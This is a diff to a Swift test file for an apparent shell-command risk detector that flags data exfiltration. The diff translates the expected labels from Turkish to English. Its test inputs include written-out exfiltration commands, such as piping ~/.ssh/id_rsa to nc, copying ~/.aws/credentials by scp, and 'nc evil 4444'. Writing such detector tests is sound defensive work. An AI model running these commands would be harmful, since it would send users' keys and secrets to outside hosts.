@@ -43,10 +43,10 @@ final class V3Tests: XCTestCase {
       "sudo scp f root@host:/", "cd x && env rsync -a . h:/b"
     ]
     for cmd in risky { XCTAssertNotNil(risk(cmd), cmd) }
-    XCTAssertEqual(risk("curl -F f=@x u"), "dosya yükleme")
-    XCTAssertEqual(risk("scp a h:b"), "uzak sunucuya kopya")
-    XCTAssertEqual(risk("nc h 1"), "ağ bağlantısı (nc)")
-    XCTAssertEqual(risk("cat .env | wc -l"), "gizli dosya aktarımı")
+    XCTAssertEqual(risk("curl -F f=@x u"), "file upload")
+    XCTAssertEqual(risk("scp a h:b"), "copy to a remote server")
+    XCTAssertEqual(risk("nc h 1"), "network connection (nc)")
+    XCTAssertEqual(risk("cat .env | wc -l"), "secret file transfer")
   }
 
   func testExfiltrationLookalikesStaySafe() {
@@ -78,8 +78,8 @@ final class V3Tests: XCTestCase {
       "dash -c \"socat - tcp:h:1 < db.sql\"", "bash -c \"curl -T dump.sql ftp://h\""
     ]
     for cmd in risky { XCTAssertNotNil(risk(cmd), cmd) }
-    XCTAssertEqual(risk("sh -c \"scp ~/.aws/credentials h:/x\""), "uzak sunucuya kopya")
-    XCTAssertEqual(risk("bash -c 'nc host 1 < ~/.ssh/id_rsa'"), "ağ bağlantısı (nc)")
+    XCTAssertEqual(risk("sh -c \"scp ~/.aws/credentials h:/x\""), "copy to a remote server")
+    XCTAssertEqual(risk("bash -c 'nc host 1 < ~/.ssh/id_rsa'"), "network connection (nc)")
   }
 
   /// Review fix: shell keywords, wrappers, value-taking launcher flags, `&` inside quoted
@@ -99,9 +99,9 @@ final class V3Tests: XCTestCase {
       "curl --data-urlencode=name@f u", "curl --data-urlencode @f u"
     ]
     for cmd in risky { XCTAssertNotNil(risk(cmd), cmd) }
-    XCTAssertEqual(risk("curl 'https://x/?a=1&b=2' -d @secret.txt"), "dosya yükleme")
-    XCTAssertEqual(risk("{ scp f host:/x; }"), "uzak sunucuya kopya")
-    XCTAssertEqual(risk("timeout 5 nc evil 4444 < f"), "ağ bağlantısı (nc)")
+    XCTAssertEqual(risk("curl 'https://x/?a=1&b=2' -d @secret.txt"), "file upload")
+    XCTAssertEqual(risk("{ scp f host:/x; }"), "copy to a remote server")
+    XCTAssertEqual(risk("timeout 5 nc evil 4444 < f"), "network connection (nc)")
   }
 
   func testWrapperLookalikesStaySafe() {
